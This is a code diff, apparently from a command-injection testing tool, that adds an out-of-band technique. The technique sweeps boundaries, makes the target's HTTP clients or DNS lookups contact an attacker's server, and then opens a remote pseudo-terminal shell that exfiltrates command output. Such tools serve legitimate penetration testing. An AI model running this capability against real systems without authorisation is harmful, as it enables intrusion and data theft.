@@ -319,6 +319,327 @@ def probe_skip_testable_value_post_detection(separator, timesec, http_request_me
   return url, ""
 
 """
+Fire every boundary/transport candidate without waiting, then poll once for the results.
+"""
+def do_oob_process(url, timesec, filename, http_request_method, injection_type, technique):
+
+  from src.core.injections.blind.techniques.oob import oob_payloads as payloads
+
+  channel = checks.init_oob_channel()
+  if channel is None:
+    return False
+
+  def _exploit(separator, prefix, suffix, whitespace, vuln_parameter, transport, TAG):
+    from src.core.injections.blind.techniques.oob import oob_injector as oob_inj
+    settings.OOB_TRANSPORT = transport
+    if not oob_inj.can_execute():
+      alternatives = payloads.exfiltration_alternatives(transport)
+      warn_msg = "Only the '" + transport + "' client reached the out-of-band server"
+      if alternatives:
+        warn_msg += " (" + ", ".join("'" + candidate + "'" for candidate in alternatives) + " did not)"
+      warn_msg += ", so the injection point is confirmed but its output cannot be retrieved. "
+      warn_msg += "Try '--oob-scheme' or an '--oob-server' the target can reach over HTTP(S)."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+      return True
+    cmd = maxlen = OUTPUT_TEXTFILE = ""
+    interpreter = menu.options.interpreter
+    _register_post_detection_action(lambda: enumeration.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, 0, technique))
+    _register_post_detection_action(lambda: file_access.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, 0, technique))
+    if menu.options.os_cmd:
+      def _run_os_cmd():
+        if settings.OS_CMD_DONE:
+          return
+        settings.OS_CMD_DONE = True
+        settings.DETECTION_PHASE = False
+        settings.EXPLOITATION_PHASE = True
+        enumeration.single_os_cmd_exec(separator, "", TAG, menu.options.os_cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, "", interpreter, filename, 0, technique)
+      _register_post_detection_action(_run_os_cmd)
+    oob_pseudo_terminal_shell(separator, prefix, suffix, whitespace, vuln_parameter, http_request_method, url, filename, technique, transport)
+    return True
+
+  stored_row = settings.STORED_TECHNIQUES.get(technique) if settings.LOAD_SESSION else None
+  if stored_row:
+    try:
+      url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, interpreter, payload, http_request_method, url_time_response, timesec, exec_time, output_length, is_vulnerable = session_handler.apply_stored_technique(stored_row)
+      url, prefix = session_handler.reapply_testable_value(url, vuln_parameter, http_request_method, prefix)
+      checks.check_for_stored_tamper(payload)
+      settings.OOB_STATE = True
+      settings.OOB_EVAL = payloads.is_eval(payload)
+      return _exploit(separator, prefix, suffix, settings.WHITESPACES[0], vuln_parameter, payloads.transport_of(payload), TAG)
+    except TypeError:
+      checks.error_loading_session_file()
+
+  _announce_technique(injection_type, technique)
+
+  # A command sink first, then an evaluation sink - the channel proves either one.
+  sinks = [(False, injection_type, settings.PREFIXES, settings.SUFFIXES, settings.SEPARATORS)]
+  if len(menu.options.tech) == 0 or "e" in menu.options.tech or "o" in menu.options.tech:
+    sinks.append((True, settings.INJECTION_TYPE.BLIND_CE, payloads.eval_prefixes(), settings.EVAL_SUFFIXES, settings.EVAL_SEPARATORS))
+
+  for is_eval, sink_type, sink_prefixes, sink_suffixes, sink_separators in sinks:
+    settings.OOB_EVAL = is_eval
+    found = _oob_sweep(is_eval, sink_type, sink_prefixes, sink_suffixes, sink_separators,
+                       url, timesec, filename, http_request_method, technique, channel, payloads, _exploit)
+    if found:
+      return found
+  settings.OOB_EVAL = False
+  # Every sink is exhausted, so close the progress line the way the other techniques do.
+  checks.injection_process(injection_type, technique, done=True)
+  return False
+
+def _oob_sweep(is_eval, injection_type, prefixes, suffixes, separators, url, timesec, filename, http_request_method, technique, channel, payloads, _exploit):
+
+  whitespaces = settings.WHITESPACES
+  prefixes, suffixes, separators, whitespaces = _prioritize_confirmed_boundary(prefixes, suffixes, separators, whitespaces)
+
+  transports = payloads.transports()
+
+  TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
+  combinations = list(_boundary_combinations(whitespaces, prefixes, suffixes, separators))
+  total = len(combinations) * len(transports)
+  i = 0
+
+  # Boundary-major, so that the first boundary that works reveals its transport at the same time,
+  # instead of paying a whole sweep to learn that the target has no curl.
+  fired = []
+  winner = None
+  for whitespace, prefix, suffix, separator in combinations:
+    # A confirmed point that nothing can be run through is kept, but the sweep goes on looking for
+    # one that can be - another boundary may well chain.
+    if winner is not None and _oob_usable(winner, payloads):
+      break
+    for transport in transports:
+      # The background poller may already have brought an earlier probe's interaction in, in which
+      # case the rest of the sweep is wasted requests. Checking costs nothing and never waits. Only
+      # an answer nothing can improve on stops the boundary, though - a name lookup that worked
+      # still leaves the HTTP clients worth a try, since they carry output back in one request.
+      if winner is not None and _oob_rank(winner, payloads) == OOB_RANK_BEST:
+        break
+      # Where the shell chains nothing, a client of ours never runs. A name lookup can still betray
+      # the point through the target's own command, but an HTTP client would only sit there waiting.
+      if not checks.separator_chains(separator) and payloads.required_protocol(transport) != "dns":
+        continue
+      bare_prefix = prefix
+      bare_suffix = suffix
+      probe_whitespace = whitespace
+      probe_prefix = prefix
+      if probe_whitespace == settings.SINGLE_WHITESPACE:
+        probe_whitespace = _urllib.parse.quote(probe_whitespace)
+      settings.DETECTION_PHASE = True
+      settings.EXPLOITATION_PHASE = False
+      i = i + 1
+      if probe_prefix + separator in settings.JUNK_COMBINATION:
+        probe_prefix = ""
+      token, hostname = channel.new_payload()
+      expression, expected, prologue = payloads.proof(transport)
+      if is_eval:
+        payload = payloads.decision_eval(separator, transport, hostname, expression, prologue)
+      else:
+        payload = payloads.decision(separator, transport, hostname, expression, prologue)
+      try:
+        response, vuln_parameter, payload, probe_prefix, probe_suffix = oob_inject(probe_prefix, suffix, probe_whitespace, payload, "", http_request_method, url)
+      except KeyboardInterrupt:
+        checks.handle_detection_interrupt(filename, url)
+      except SystemExit:
+        raise
+      except Exception:
+        continue
+      fired.append((token, separator, probe_prefix, probe_suffix, probe_whitespace, bare_prefix, bare_suffix, vuln_parameter, payload, expected, transport))
+      checks.injection_process(injection_type, technique, done=False, i=i, total=total)
+      # The earliest combinations are the likeliest, so keep asking the server over the first few
+      # rather than sitting out the poll interval and firing the rest of the sweep for nothing. An
+      # interaction needs a moment to land, so one immediate poll would always be too early.
+      if len(fired) <= settings.OOB_EAGER_POLLS:
+        channel.poll_now()
+      winner = _oob_winner(fired, channel, payloads)
+
+  if not fired:
+    return False
+
+  # Every probe is already in flight, so one wait covers the whole sweep. A client that cannot carry
+  # output is settled for only once the wait is over, in case one that can is a moment behind it -
+  # unless no probe that could do better was fired at all, in which case there is nothing to wait for.
+  best_reachable = OOB_RANK_BEST
+  if not any(payloads.required_protocol(probe[10]) == "http" for probe in fired):
+    best_reachable = OOB_RANK_LOOKUP
+  deadline = time.time() + settings.OOB_TIMEOUT
+  while time.time() < deadline:
+    candidate = _oob_winner(fired, channel, payloads)
+    if candidate is not None and (winner is None or _oob_rank(candidate, payloads) >= _oob_rank(winner, payloads)):
+      winner = candidate
+    if winner is not None and _oob_rank(winner, payloads) >= best_reachable:
+      break
+    # Asked for every round: the idle interval would hold the answer back for seconds after it lands.
+    channel.poll_now()
+    time.sleep(settings.OOB_WAIT_POLL_INTERVAL)
+
+  if winner is None:
+    return False
+
+  token, separator, prefix, suffix, whitespace, bare_prefix, bare_suffix, vuln_parameter, payload, expected, transport = winner
+  # The boundary is settled, so the clients the sweep left out are worth one request each here -
+  # a single try on a boundary that works, rather than one on every boundary that might not.
+  if payloads.required_protocol(transport) == "dns":
+    upgrade = _oob_http_upgrade(is_eval, separator, prefix, suffix, whitespace, vuln_parameter, url, http_request_method, filename, channel, payloads)
+    if upgrade is not None:
+      transport, payload = upgrade
+  # Named now, so the finding is announced with the channel it came back over.
+  settings.OOB_TRANSPORT = transport
+  # Only where they were tried: a forced transport means nothing was learnt about the others.
+  tried = [] if menu.options.oob_transport else payloads.tried_http_clients()
+  # The finding itself already names the channel, so which clients led to it is a debug detail.
+  if settings.VERBOSITY_LEVEL != 0:
+    if payloads.required_protocol(transport) == "dns":
+      if tried:
+        debug_msg = "None of the HTTP(S) clients tried ("
+        debug_msg += ", ".join("'" + candidate + "'" for candidate in tried)
+        debug_msg += ") reached the out-of-band server, so the output comes back a label at a time."
+        settings.print_data_to_stdout(settings.print_bold_debug_msg(debug_msg))
+    else:
+      debug_msg = "The '" + transport + "' client on the target reached the out-of-band server, "
+      debug_msg += "so the output of a command comes back whole."
+      settings.print_data_to_stdout(settings.print_bold_debug_msg(debug_msg))
+
+  # Re-confirm with a fresh token, against a stray interaction.
+  for _ in range(settings.RESULTS_BASED_VERIFY_ROUNDS):
+    verify_token, verify_hostname = channel.new_payload()
+    verify_expression, verify_expected, verify_prologue = payloads.proof(transport)
+    if is_eval:
+      verify_payload = payloads.decision_eval(separator, transport, verify_hostname, verify_expression, verify_prologue)
+    else:
+      verify_payload = payloads.decision(separator, transport, verify_hostname, verify_expression, verify_prologue)
+    oob_inject(prefix, suffix, whitespace, verify_payload, vuln_parameter, http_request_method, url)
+    if not checks.oob_proof_holds(channel.wait_for(verify_token, settings.OOB_TIMEOUT,
+                                                   protocol=payloads.required_protocol(transport)),
+                                  verify_expected):
+      checks.unexploitable_point()
+      return False
+
+  checks.injection_process(injection_type, technique, done=True)
+  settings.CONFIRMED_BOUNDARY[settings.CHECKING_PARAMETER] = (bare_prefix, bare_suffix, separator, whitespace)
+  checks.identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, 1, checks.finding_title(separator, whitespace, bare_prefix, bare_suffix))
+  session_handler.import_injection_points(url, technique, injection_type, filename, separator, True, vuln_parameter, prefix, suffix, TAG, menu.options.interpreter, payload, http_request_method, url_time_response=0, timesec=0, exec_time=0, output_length=0, is_vulnerable=settings.INJECTION_LEVEL)
+  return _exploit(separator, prefix, suffix, whitespace, vuln_parameter, transport, TAG)
+
+"""
+Send an out-of-band payload without waiting around for a response it never reads. Clients on the
+target can block for a long time - 'certutil' for well over a minute - and a sweep that waited for
+each of them would take hours to learn nothing.
+"""
+def oob_inject(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url):
+  saved_timeout, saved_keep_alive = settings.TIMEOUT, settings.KEEP_ALIVE
+  settings.TIMEOUT = min(saved_timeout, settings.OOB_PROBE_TIMEOUT)
+  # A pooled connection keeps the timeout it was opened with, so the shorter one would not apply
+  # to any probe that reuses it.
+  settings.KEEP_ALIVE = False
+  try:
+    return requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
+  finally:
+    settings.TIMEOUT, settings.KEEP_ALIVE = saved_timeout, saved_keep_alive
+
+"""
+The first fired probe whose interaction has arrived and carries the result it was asked for.
+"""
+def _oob_winner(fired, channel, payloads):
+  # The most useful of the confirmed ones, not the first: see _oob_rank() below.
+  winner = None
+  for candidate in fired:
+    interactions = channel.seen(candidate[0], protocol=payloads.required_protocol(candidate[10]))
+    if not checks.oob_proof_holds(interactions, candidate[9]):
+      continue
+    if winner is None or _oob_rank(candidate, payloads) > _oob_rank(winner, payloads):
+      winner = candidate
+      if _oob_rank(winner, payloads) == OOB_RANK_BEST:
+        break
+  return winner
+
+"""
+Ask the clients the sweep left out whether they can reach us through the boundary the name lookup
+has just confirmed. The point is already found, so this is only a chance at pulling output back
+whole instead of a label at a time - one request each, and a short wait for all of them together.
+"""
+def _oob_http_upgrade(is_eval, separator, prefix, suffix, whitespace, vuln_parameter, url, http_request_method, filename, channel, payloads):
+  if menu.options.oob_transport or not settings.OOB_HEURISTIC_HTTP_SILENT:
+    return None
+  fired = []
+  for candidate in payloads.upgrade_candidates():
+    token, hostname = channel.new_payload()
+    expression, expected, prologue = payloads.proof(candidate)
+    if is_eval:
+      payload = payloads.decision_eval(separator, candidate, hostname, expression, prologue)
+    else:
+      payload = payloads.decision(separator, candidate, hostname, expression, prologue)
+    try:
+      # The payload that went out is the one the tamper scripts shaped, and that is the one a
+      # finding has to be reported and stored with.
+      _, _, payload, _, _ = oob_inject(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
+    except KeyboardInterrupt:
+      checks.handle_detection_interrupt(filename, url)
+    except SystemExit:
+      raise
+    except Exception:
+      continue
+    fired.append((token, expected, candidate, payload))
+  if not fired:
+    return None
+  # The heuristic already suggests nothing gets out over HTTP, so this waits out the grace period
+  # rather than the full timeout - the lookup is there to fall back on either way.
+  deadline = time.time() + settings.OOB_HTTP_GRACE
+  while True:
+    for token, expected, candidate, payload in fired:
+      if checks.oob_proof_holds(channel.seen(token, protocol="http"), expected):
+        return candidate, payload
+    if time.time() >= deadline:
+      return None
+    channel.poll_now()
+    time.sleep(settings.OOB_WAIT_POLL_INTERVAL)
+
+"""
+Nothing beats a confirmed probe whose client can be asked for a command's output in one request.
+"""
+OOB_RANK_BEST = 3
+
+"""
+A confirmed probe whose client can only carry output back a label at a time.
+"""
+OOB_RANK_LOOKUP = 2
+
+"""
+How much use a confirmed probe is. An HTTP client carries a command's output back whole, a name
+lookup carries it a label at a time, and a boundary nothing can be run through is only worth
+reporting - so both kinds of client are tried before settling for the slower one.
+"""
+def _oob_rank(candidate, payloads):
+  if not _oob_usable(candidate, payloads):
+    return 1
+  return OOB_RANK_BEST if payloads.required_protocol(candidate[10]) == "http" else OOB_RANK_LOOKUP
+
+"""
+Report whether a confirmed probe is one a command can be run through: the separator has to chain a
+command of our own, and the client has to be able to carry its output back.
+"""
+def _oob_usable(candidate, payloads):
+  return checks.separator_chains(candidate[1]) and payloads.supports_exfiltration(candidate[10])
+
+"""
+Open the pseudo-terminal on top of the out-of-band channel.
+"""
+def oob_pseudo_terminal_shell(separator, prefix, suffix, whitespace, vuln_parameter, http_request_method, url, filename, technique, transport):
+  from src.core.injections.blind.techniques.oob import oob_injector as injector
+
+  def execute_cmd(cmd):
+    stored = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
+    if not menu.options.ignore_session and checks.usable_stored_cmd(stored):
+      return stored
+    shell = injector.injection(separator, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, transport)
+    logs.executed_command(filename, cmd, shell)
+    if shell and not menu.options.ignore_session:
+      session_handler.store_cmd(url, cmd, shell, vuln_parameter)
+    return shell
+
+  return pseudo_terminal_shell_generic(url, filename, technique, False, execute_cmd, separator=separator)
+
+"""
 The main Time-related exploitation process.
 """
 def do_time_related_process(url, timesec, filename, http_request_method, url_time_response, injection_type, technique, tmp_path):
@@ -331,6 +652,8 @@ def do_time_related_process(url, timesec, filename, http_request_method, url_tim
       settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
       settings.THREADED_TIME_RETRIEVAL_CHOICE = False
     else:
+      # Answered yes, the retrieval still measures whether the answers can be told apart under that
+      # concurrency - which needs a payload, and so cannot be settled here.
       msg = "Multi-threading is considered unsafe for time-related data retrieval. "
       msg += "Do you want to continue using threads anyway? [Y/n] "
       settings.THREADED_TIME_RETRIEVAL_CHOICE = common.read_input(msg, default="Y", check_batch=True) in settings.CHOICE_YES
@@ -421,6 +744,32 @@ def do_time_related_process(url, timesec, filename, http_request_method, url_tim
         OUTPUT_TEXTFILE = ""  # only used by TEMP_FILE_BASED, set just below
         if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
           OUTPUT_TEXTFILE = injector.select_output_filename(technique, tmp_path, TAG)
+        # What these payloads cost is part of the answer's time: one that writes a file and reads it
+        # back through two interpreters takes about a second before any delay is asked for, while the
+        # model it is judged against was built from plain requests. Sampled once with a length that
+        # cannot hold, so an answer that was never held back is not read as a delayed one.
+        if not settings.PAYLOAD_BASELINE_SAMPLED:
+          settings.PAYLOAD_BASELINE_SAMPLED = True
+          impossible = int(tag_length) + 100
+          if interpreter:
+            if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+              probe = payloads.decision_alter_interpreter(separator, TAG, impossible, timesec, http_request_method)
+            else:
+              probe = payloads.decision_alter_interpreter(separator, impossible, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)
+          else:
+            if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+              probe = payloads.decision(separator, TAG, impossible, timesec, http_request_method)
+            else:
+              probe = payloads.decision(separator, impossible, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)
+          if probe:
+            try:
+              probe_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, probe, "", http_request_method, url)
+              checks.record_baseline_response_time(probe_time)
+            except (KeyboardInterrupt, SystemExit):
+              raise
+            except Exception:
+              pass
+
         for output_length in range(1, int(tag_length)):
           try:
             # Tempfile-based decision payload (check if host is vulnerable).
@@ -449,12 +798,16 @@ def do_time_related_process(url, timesec, filename, http_request_method, url_tim
                 false_positive_fixation = False
                 if len(TAG) == output_length:
 
-                  statistical_anomaly = True
-                  first_few = exec_time_statistic[0:5]
-                  if first_few and max(first_few) - min(first_few) <= max(settings.MIN_VALID_DELAYED_RESPONSE, timesec * 0.5):
-                    if max(xrange(len(exec_time_statistic)), key=lambda x: exec_time_statistic[x]) == len(TAG) - 1:
-                      statistical_anomaly = False
-                      exec_time_statistic = []
+                  # Only where one candidate length is answered late and the rest on time is the
+                  # sample's shape worth reading: an oracle that answers every candidate the same
+                  # way would otherwise be called unstable on every run.
+                  statistical_anomaly = checks.decision_is_length_based()
+                  if statistical_anomaly:
+                    first_few = exec_time_statistic[0:5]
+                    if first_few and max(first_few) - min(first_few) <= max(settings.MIN_VALID_DELAYED_RESPONSE, timesec * 0.5):
+                      if max(xrange(len(exec_time_statistic)), key=lambda x: exec_time_statistic[x]) == len(TAG) - 1:
+                        statistical_anomaly = False
+                        exec_time_statistic = []
 
                   if timesec <= exec_time and not statistical_anomaly:
                     false_positive_fixation = True
@@ -618,6 +971,9 @@ def do_results_based_process(url, timesec, filename, http_request_method, inject
     prefixes = settings.PREFIXES
     suffixes = settings.SUFFIXES
     separators = settings.SEPARATORS
+    if settings.TARGET_OS == settings.OS.WINDOWS:
+      # Dropped up front, so the attempt count reflects what cmd.exe can actually chain on.
+      separators = [_separator for _separator in separators if checks.windows_separator(_separator) is not None]
 
   if not settings.LOAD_SESSION or technique not in settings.STORED_TECHNIQUES:
     _announce_technique(injection_type, technique)
@@ -632,6 +988,10 @@ def do_results_based_process(url, timesec, filename, http_request_method, inject
   TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
   i = 0
   total = len(whitespaces) * len(prefixes) * len(suffixes) * len(separators)
+  if technique == settings.INJECTION_TECHNIQUE.FILE_BASED and int(menu.options.failed_tries) >= total:
+    # The temporary directory is offered after this many failed writes, so it has to be reachable
+    # however few boundary combinations there are to try - a Windows target leaves fewer.
+    menu.options.failed_tries = max(1, total - 1)
   for whitespace, prefix, suffix, separator in _boundary_combinations(whitespaces, prefixes, suffixes, separators):
     bare_prefix = prefix
     bare_suffix = suffix
@@ -699,6 +1059,11 @@ def do_results_based_process(url, timesec, filename, http_request_method, inject
           else:
             # Classic decision payload (check if host is vulnerable).
             payload = payloads.decision(separator, TAG, randv1, randv2)
+
+        # No payload for this separator - cmd.exe cannot chain on it, so there is nothing to send.
+        if not payload:
+          checks.injection_process(injection_type, technique, done=bool(no_result and i >= total), i=i, total=total)
+          continue
 
         vuln_parameter = ""
         response, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
